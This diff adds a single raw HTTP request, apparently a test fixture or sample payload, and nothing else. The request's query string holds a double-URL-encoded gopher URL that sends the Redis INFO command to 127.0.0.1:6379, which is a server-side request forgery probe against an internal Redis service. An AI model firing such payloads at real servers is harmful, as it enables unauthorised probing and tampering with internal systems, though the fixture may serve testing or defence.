@@ -1,0 +1,4 @@
+GET /a?q=gopher%253A%252F%252F127.0.0.1%253A6379%252F_INFO HTTP/1.1
+Host: demo.example.com
+Connection: close
+
